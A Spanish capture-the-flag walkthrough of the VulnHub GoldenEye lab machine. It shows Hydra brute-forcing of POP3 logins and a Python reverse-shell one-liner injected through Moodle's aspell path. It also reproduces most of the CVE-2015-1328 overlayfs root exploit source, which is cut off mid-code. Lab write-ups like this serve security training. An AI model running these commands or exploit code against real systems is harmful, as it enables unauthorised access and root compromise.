---
title: VulnHub GoldenEye
author: k4miyo
date: 2022-01-01
math: true
mermaid: true
image:
  path: /assets/images/vulnhub/vulnhub.png
categories: [Medium, Linux]
tags: [CMS, Web, POP3, CC]
ping: true
---

## GoldenEye
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.0.0.24 (**Nota**: La dirección IP cambia de acuerdo a nuestra red y se comparte un link para descargar la máquina virtual [goldeneye-1](https://www.vulnhub.com/entry/goldeneye-1,240/)) .

```bash
❯ ping -c 1 10.0.0.24
PING 10.0.0.24 (10.0.0.24) 56(84) bytes of data.
64 bytes from 10.0.0.24: icmp_seq=1 ttl=64 time=0.595 ms

--- 10.0.0.24 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.595/0.595/0.595/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.0.0.24 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-01 14:11 CST
Initiating ARP Ping Scan at 14:11
Scanning 10.0.0.24 [1 port]
Completed ARP Ping Scan at 14:11, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:11
Scanning 10.0.0.24 [65535 ports]
Discovered open port 80/tcp on 10.0.0.24
Discovered open port 25/tcp on 10.0.0.24
Discovered open port 55006/tcp on 10.0.0.24
Discovered open port 55007/tcp on 10.0.0.24
Completed SYN Stealth Scan at 14:12, 47.13s elapsed (65535 total ports)
Nmap scan report for 10.0.0.24
Host is up (0.013s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
55006/tcp open  unknown
55007/tcp open  unknown
MAC Address: 00:0C:29:02:63:89 (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 47.34 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.0.0.24
   5   │     [*] Open ports: 25,80,55006,55007
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p25,80,55006,55007 10.0.0.24 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-01 14:13 CST
Nmap scan report for 10.0.0.24
Host is up (0.00029s latency).

PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: TLS randomness does not represent time
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-title: GoldenEye Primary Admin Server
|_http-server-header: Apache/2.4.7 (Ubuntu)
55006/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
55007/tcp open  pop3        Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: RESP-CODES USER UIDL TOP AUTH-RESP-CODE SASL(PLAIN) STLS CAPA PIPELINING
MAC Address: 00:0C:29:02:63:89 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.26 seconds
```

Vemos el puerto 80 abierto, así que antes de ver el contenido vía web, vamos a ver a lo que nos enfrentamos en la herramienta `whatweb`:

```bash
❯ whatweb http://10.0.0.24/
http://10.0.0.24/ [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.0.0.24], Script, Title[GoldenEye Primary Admin Server]
```

Nos vemos nada interesante, asi que vamos a ver su contenido vía web.

![""](/assets/images/vh-goldeneye/goldeneye-web.png)

Si checamos el código fuente al sitio web, vemos el script `terminal.js`.

![""](/assets/images/vh-goldeneye/goldeneye-web1.png)

Y si observamos el contenido de dicho archivo, tenemos usuarios potenciales y una contraseña url encodeada.

![""](/assets/images/vh-goldeneye/goldeneye-web2.png)

Tenemos el usuario **Boris** y **Natalya**; además dentro del texto nos indica que se tiene una contraseña cifrada que si buscamos los caracteres separados por punto y coma (;), Google nos transforma a la letra de corresponde, por lo que deberiamos buscar sería  ***ampersand hash encoding*** y vemos que la cadena está cifrada por entidades de HTML por lo que podríamos descifrar mediante algun recurso de internet de URL Encode/Decode.

![""](/assets/images/vh-goldeneye/goldeneye-web3.png)

Adicional, dentro del sitio web nos indica que debemos consulta un recurso bajo la ruta `/sev-home/`:

![""](/assets/images/vh-goldeneye/goldeneye-web4.png)

Entonces ya tenemos unas posibles credenciales y un panel de login, por lo que podríamos tratar de ingresar y como siempre, recordar guardar las credenciales y usuarios que tengamos. Tenemos que la combinación es `boris : InvincibleHack3r`.

![""](/assets/images/vh-goldeneye/goldeneye-web5.png)

Si vemos el código fuente hasta abajo, tenemos una leyenda que nos dice ***Qualified GoldenEye Network Operator Supervisors:  Natalya Boris***; por lo que ya debemos estar pensando que podrian ser usuarios a nivel de sistema. Nos vemos nada más interesante aquí, así que vamos a pasar por otros puertos que nos dio `nmap` y este caso sería el puerto 55007 asociado al servicio POP3. Si probamos las credenciales que tenemos, no obtenemos ningún resultado, así que vamos a tratar de emplear fuerza bruta para obtener las credenciales para ambos usuarios y para este caso vamos utilizar el diccionario `/usr/share/wordlists/fasttrack.txt` debido a que la contraseña no aparece en nuestro diccionario de confianza `rockyou.txt`:

```bash
❯ hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3://10.0.0.24 -s 55007
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-01 18:13:13
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://10.0.0.24:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
[55007][pop3] host: 10.0.0.24   login: boris   password: secret1!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-01 18:15:53
```

```bash
❯ hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3://10.0.0.24 -s 55007
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-01 18:18:41
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://10.0.0.24:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[55007][pop3] host: 10.0.0.24   login: natalya   password: bird
[STATUS] 111.00 tries/min, 222 tries in 00:02h, 1 to do in 00:01h, 15 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-01 18:20:41
```

Ya contamos con credeciales de acceso al servicio POP3, así que vamos a echarle un ojito a los correos, primero para el usuario **Boris**:

```bash
❯ telnet 10.0.0.24 55007  
Trying 10.0.0.24...                                             
Connected to 10.0.0.24.                                         
Escape character is '^]'.                                       
+OK GoldenEye POP3 Electronic-Mail System     
USER boris                                                      
+OK                           
PASS secret1!
+OK Logged in.                                                                                                                   LIST                                                            
+OK 3 messages:
1 544 
2 373         
3 921                        
.                   
RETR 1                    
+OK 544 octets                                                  
Return-Path: <root@127.0.0.1.goldeneye>             
X-Original-To: boris                                            
Delivered-To: boris@ubuntu                                      
Received: from ok (localhost [127.0.0.1])  
        by ubuntu (Postfix) with SMTP id D9E47454B1
        for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye
                                
Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for securi
ty risks because I trust you and the other admins here.
.                         
RETR 2                                                          
+OK 373 octets                                                  
Return-Path: <natalya@ubuntu>                                   
X-Original-To: boris                                            
Delivered-To: boris@ubuntu                                      
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id C3F2B454B1
        for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)                                                                                      From: natalya@ubuntu                                                                                                                                                                                                                                              
Boris, I can break your codes!
.
RETR 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
        for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.
```

De los correos observados, tenemos otro potencial usuario **Xenia** el cual podríamos tratar de obtener sus credenciales de acceso a POP3 mediante fuerza bruta; pero antes de eso vamos a ver los correos del usuario **Natalya**.

```bash
❯ telnet 10.0.0.24 55007
Trying 10.0.0.24...
Connected to 10.0.0.24.   
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER natalya                                                    
+OK                                                             
PASS bird                                                       
+OK Logged in.                                                  
LIST                                                            
+OK 2 messages:  
1 631
2 1048                                                                                                                           .                      
RETR 1
+OK 631 octets                                                                                                                   Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id D5EDA454B1
        for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu                                               
                                                                
Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a studen
t is designated to you.                                         
                                
Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Jan
us.                                                                                                                              . 
RETR 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.


.

```

Contamos con credenciales del usuario **xenia**; sin embargo, no sabemos que sean reutilizables y sean de correo o del dominio que indican `severnaya-station.com/gnocertdir`, por lo tanto primero vamos a probar para el servicio POP3 y en caso no ser válido, utilizaremos fuerza bruta para tratar de obtener sus credenciales. 

```bash
❯ telnet 10.0.0.24 55007
Trying 10.0.0.24...
Connected to 10.0.0.24.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER xenia
+OK
PASS RCP90rulez!
-ERR [AUTH] Authentication failed.
QUIT
+OK Logging out
Connection closed by foreign host.
```

Vemos que no aplican, así que vamos vamos a agregar el dominio `severnaya-station.com` a nuestro archivo `/etc/hosts` ya que se está aplicando *virtual hosting* y vamos a checar el recurso que nos indican `severnaya-station.com/gnocertdir`, que ya debemos estar pensando que debe tener un panel de login.

![""](/assets/images/vh-goldeneye/goldeneye-web6.png)

Y tenemos un CMS (gestor de contenido) Moodle, así que vamos a tratar de loggearnos utilizando las credenciales que tenemos.

![""](/assets/images/vh-goldeneye/goldeneye-web7.png)

Navegando dentro del sitio, en ***My profile > Messages*** tenemos un mensaje del usuario **Dr Doak** :

![""](/assets/images/vh-goldeneye/goldeneye-web8.png)

Básicamente nos dice que el usuario de correo electrónico es **doak**; por lo que ya debemos estar pensando que tratar de utilizar fuerza bruta para obtener su contraseña.

```bash
❯ hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://10.0.0.24 -s 55007
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-01 18:45:53
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://10.0.0.24:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[STATUS] 72.00 tries/min, 144 tries in 00:02h, 78 to do in 00:02h, 16 active
[55007][pop3] host: 10.0.0.24   login: doak   password: goat
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-01 18:48:21
```

Ya tenemos las credenciales de **doak** así que vamos a echarle un ojo a los correos que tiene:

```bash
❯ telnet 10.0.0.24 55007
Trying 10.0.0.24...
Connected to 10.0.0.24.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER doak
+OK
PASS goat
+OK Logged in.
LIST
+OK 1 messages:
1 606
.
RETR 1 
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 97DC24549D
        for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!

.

```

Tenemos un probable usuario **james** y unas credenciales de acceso (posiblemente del CMS Moodle), por lo que vamos a tratar de ingresar al sitio con las nuevas credenciales  (**Nota**: Como siempre, debemos de guardar todas las credenciales que encontremos).

![""](/assets/images/vh-goldeneye/goldeneye-web9.png)

Bajo la ruta ***My profile > My private files*** vemos un recurso llamado **s3cret.txt**, así que le echamos un ojo:

![""](/assets/images/vh-goldeneye/goldeneye-web10.png)

```bash
❯ cat s3cret.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: s3cret.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 007,
   2   │ 
   3   │ I was able to capture this apps adm1n cr3ds through clear txt. 
   4   │ 
   5   │ Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 
   6   │ 
   7   │ Something juicy is located here: /dir007key/for-007.jpg
   8   │ 
   9   │ Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
```

Básicamente lo que nos dice es que chequemos el recurso `/dir007key/for-007.jpg`:

![""](/assets/images/vh-goldeneye/goldeneye-web11.png)

Nos vemos nada interesante en la imagen, así que vamos a descargarla y tratar de ver metadatos o si se está aplicando esteganografía.

```bash
❯ exiftool for-007.jpg
ExifTool Version Number         : 12.16
File Name                       : for-007.jpg
Directory                       : .
File Size                       : 15 KiB
File Modification Date/Time     : 2022:01:01 18:58:04-06:00
File Access Date/Time           : 2022:01:01 18:58:04-06:00
File Inode Change Date/Time     : 2022:01:01 18:58:14-06:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 300
Y Resolution                    : 300
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : eFdpbnRlcjE5OTV4IQ==
Make                            : GoldenEye
Resolution Unit                 : inches
Software                        : linux
Artist                          : For James
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
User Comment                    : For 007
Flashpix Version                : 0100
Image Width                     : 313
Image Height                    : 212
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 313x212
Megapixels                      : 0.066
```

En la descripción de la imagen vemos algo curioso, es una cadena en base 64, así que vamos a obtenerla en texto claro.

```bash
❯ echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d; echo
xWinter1995x!
```

Tenemos una contraseña y lo más seguro es que sea del usuario **admin** de acuerdo con el mensaje que vimos en `s3cret.txt`; así que vamos a tratar de loggearnos en el gestor de contenido.

![""](/assets/images/vh-goldeneye/goldeneye-web12.png)

Como nos encontramos como el usuario **admin**, podemos modificar algunas cosas del gestor del contenido, por lo que si buscamos un exploit público asociado a **Moodle 2.2.3** encontramos payloads del framework de metasploit; pero en este sitio cristiano no ocupamos ese tipo de cosas, por lo que vamos a analizar lo que hace el [exploit](https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/remote/29324.rb).

- Primero nos dice que debemos ir a la ruta `/gnocertdir/admin/settings.php?section=editorsettingstinymce` y modificar el valor de **Spell engine** por **PSpellShell** y guardamos los cambios.

![""](/assets/images/vh-goldeneye/goldeneye-web13.png)

- Después debemos ir a `/gnocertdir/admin/settings.php?section=systempaths` y en el parámetro **Path to aspell** debemos poner nuestro comando que nos entable una reverse shell, para este caso utilizaremos python con la siguiente instrucción: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.25",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` y guardamos los cambios.

![""](/assets/images/vh-goldeneye/goldeneye-web14.png)

- Ahora necesitamos consulta el recurso `/gnocertdir/lib/editor/tinymce/tiny_mce/3.4.9/plugins/spellchecker/rpc.php` .

![""](/assets/images/vh-goldeneye/goldeneye-web15.png)

- Damos click secundario y elegimos la opción de **Inspeccionar**, en la nueva ventana que nos aparece seleccionamos **Red** y volvemos a cargar la página.

![""](/assets/images/vh-goldeneye/goldeneye-web16.png)

- Le damos click secundario a la petición que se realiza y seleccionamos la opción **Editar y reenviar**. El método lo debemos cambiar de **GET** a **POST** en el el **Cuerpo de la petición** agregamos `{"id":"c0","method":"checkWords","params":["en",[""]]}` y antes de envíar la petición, nos ponemos en escucha por el puerto 443 y la enviamos.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.0.0.25] from (UNKNOWN) [10.0.0.24] 38871
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Ya nos encontramos dentro del sistema y para trabajar más cómodos, vamos a hacer un [Tratamiento de la tty](/posts/tratamiento-tty). Ahora vamos a enumerar un poco el sistema para encontrar una forma de escalar privilegios, debido a que somos el usuario **www-data**:

```bash
www-data@ubuntu:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/var/www/html$ sudo -l 
[sudo] password for www-data: 
www-data@ubuntu:/var/www/html$ cd /
www-data@ubuntu:/$ find \-perm -4000 2>/dev/null
./bin/umount
./bin/ping6
./bin/ping
./bin/su
./bin/mount
./bin/fusermount
./usr/bin/chfn
./usr/bin/sudo
./usr/bin/chsh
./usr/bin/gpasswd
./usr/bin/newgrp
./usr/bin/mtr
./usr/bin/passwd
./usr/bin/traceroute6.iputils
./usr/lib/openssh/ssh-keysign
./usr/lib/eject/dmcrypt-get-device
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/pt_chown
./usr/sbin/pppd
./usr/sbin/uuidd
www-data@ubuntu:/$ cd /var/www/html/
www-data@ubuntu:/var/www/html$ ls -l
total 264
drwxr-xr-x  3 www-data www-data   4096 Apr 25  2018 006-final
drwxr-xr-x  2 www-data www-data   4096 Apr 25  2018 dir007key
drwxr-xr-x 41 www-data www-data   4096 Apr 25  2018 gnocertdir
-rwxr--r--  1 www-data www-data    354 Apr 24  2018 index.css
-rw-r--r--  1 www-data www-data    252 Apr 25  2018 index.html
-rw-r--r--  1 www-data www-data  39748 Apr 24  2018 logo.png
-rw-r--r--  1 www-data www-data      4 Apr 25  2018 rtm.log
drwxr-xr-x  2 www-data www-data   4096 Apr 24  2018 sev-home
-rw-r--r--  1 www-data www-data 184883 Apr 25  2018 sniper.png
-rw-r--r--  1 www-data www-data   2301 Apr 29  2018 space.gif
-rw-r--r--  1 www-data www-data   1414 Apr 29  2018 splashAdmin.php
-rw-r--r--  1 www-data www-data   1349 Apr 24  2018 terminal.js
www-data@ubuntu:/var/www/html$
```

Dentro del directorio `/var/www/html` tenemos algo que nos debería de llamar la atención: `splashAdmin.php`, así que vamos a echarle un ojo.

```bash
www-data@ubuntu:/var/www/html$ cat splashAdmin.php 
<html>
<body background="space.gif">
<h2 style="color:green;">Cobalt Qube 3 has been decommissioned</h2>
<br/>
<h3 style="color:white;">We can use this page to put up team photos, discussion, etc. Natalya is not allowed to post here though --Boris</h3>
<br/><br/>
<hr>
<p style="color:red;">Here's me with my new sniper rifle.</p>
<br/><br/>
<img src="sniper.png">
<br/>
<hr>
<p style="color:orange;">
Boris why are you wearing shorts in that photo? You do realize you're stationed above the Arctic circle, correct?
<br/><br/>
BTW your favorite pen broke, but I replaced it with a new special one.
<br/><br/>
Natalya "best coder" S.</p>
<hr>
<p style="color:red;">"License to Kill - Complex Grenade Launchers - No Oddjob" - Unknown"</p>
<hr>
<p style="color:white;">Greetings ya'll! GoldenEye Admin here.
<br/><br/>
For programming I highly prefer the Alternative to GCC, which FreeBSD uses. It's more verbose when compiling, throwing warnings and such - this can easily be turned off with a proper flag. I've replaced GCC with this throughout the GolenEye systems.
<br/><br/>
Boris, no arguing about this, GCC has been removed and that's final! 
<br/><br/>
Also why have you been chatting with Xenia in private Boris? She's a new contractor that you've never met before? Are you sure you've never worked together...?
<br/><br/>
-Admin 
</p>
<hr>
<p style="color:purple;">
Janus was here
</p>
<hr>
</body>
</html>
www-data@ubuntu:/var/www/html$
```

Aqui nos dice que GCC ha sido eliminado del sistema y que se ocupa algo alternativo sobre FreeBSD (en este caso CC). Ahora vamos a ver el tipo de máquina que nos enfrentamos.

```bash
www-data@ubuntu:/var/www/html$ uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
www-data@ubuntu:/var/www/html$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 14.04.1 LTS
Release:        14.04
Codename:       trusty
www-data@ubuntu:/var/www/html$
```

De acuerdo con la versión del sistema operativo y buscando un poco, encontramos un programa en **C** que nos puede ayudar a escalar privilegios [37292.c](https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/local/37292.c) y como la máquina no tiene gcc para compilar, en el mismo programa cambiaremos **gcc** por **cc** y lo compilaremos en la máquina haciendo uso de un directorio donde tengas privilegios de escritura y ejecución `/dev/shm`:

```c
/*

# Exploit Title: ofs.c - overlayfs local root in ubuntu

# Date: 2015-06-15

# Exploit Author: rebel

# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)

# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04

# CVE : CVE-2015-1328 (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*

CVE-2015-1328 / ofs.c

overlayfs incorrect permission handling + FS_USERNS_MOUNT

user@ubuntu-server-1504:~$ uname -a

Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux

user@ubuntu-server-1504:~$ gcc ofs.c -o ofs

user@ubuntu-server-1504:~$ id

uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)

user@ubuntu-server-1504:~$ ./ofs

spawning threads

mount #1

mount #2

child threads done

/etc/ld.so.preload created

creating shared library

# id

uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)

greets to beist & kaliman

2015-05-24

%rebel%

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*

*/

#include <stdio.h>

#include <stdlib.h>

#include <unistd.h>

#include <sched.h>

#include <sys/stat.h>

#include <sys/types.h>

#include <sys/mount.h>

#include <stdio.h>

#include <stdlib.h>

#include <unistd.h>

#include <sched.h>

#include <sys/stat.h>

#include <sys/types.h>

#include <sys/mount.h>

#include <sys/types.h>

#include <signal.h>

#include <fcntl.h>

#include <string.h>

#include <linux/sched.h>

#define LIB "#include <unistd.h>\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &path, 128);\nif(geteuid() == 0 && !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n return _real_getuid();\n}\n"

static char child_stack[1024*1024];

static int

child_exec(void *stuff)

{

char *file;

system("rm -rf /tmp/ns_sploit");

mkdir("/tmp/ns_sploit", 0777);

mkdir("/tmp/ns_sploit/work", 0777);

mkdir("/tmp/ns_sploit/upper",0777);

mkdir("/tmp/ns_sploit/o",0777);

fprintf(stderr,"mount #1\n");

if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper") != 0) {

// workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower

if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) {

fprintf(stderr, "no FS_USERNS_MOUNT for overlayfs on this kernel\n");

exit(-1);

}

file = ".access";

chmod("/tmp/ns_sploit/work/work",0777);

} else file = "ns_last_pid";

chdir("/tmp/ns_sploit/o");

rename(file,"ld.so.preload");

chdir("/");

umount("/tmp/ns_sploit/o");

fprintf(stderr,"mount #2\n");

if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) {

if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) {

exit(-1);

}

chmod("/tmp/ns_sploit/work/work",0777);

}

chmod("/tmp/ns_sploit/o/ld.so.preload",0777);

umount("/tmp/ns_sploit/o");

}

int

main(int argc, char **argv)

{

int status, fd, lib;

pid_t wrapper, init;

int clone_flags = CLONE_NEWNS | SIGCHLD;

fprintf(stderr,"spawning threads\n");

if((wrapper = fork()) == 0) {

if(unshare(CLONE_NEWUSER) != 0)

fprintf(stderr, "failed to create new user namespace\n");

if((init = fork()) == 0) {

pid_t pid =

clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);

if(pid < 0) {

fprintf(stderr, "failed to create new mount namespace\n");

exit(-1);

}

waitpid(pid, &status, 0);

}

waitpid(init, &status, 0);

return 0;

}

usleep(300000);

wait(NULL);

fprintf(stderr,"child threads done\n");

fd = open("/etc/ld.so.preload",O_WRONLY);

if(fd == -1) {

fprintf(stderr,"exploit failed\n");

exit(-1);

}

fprintf(stderr,"/etc/ld.so.preload created\n");

fprintf(stderr,"creating shared library\n");

lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);

write(lib,LIB,strlen(LIB));

close(lib);
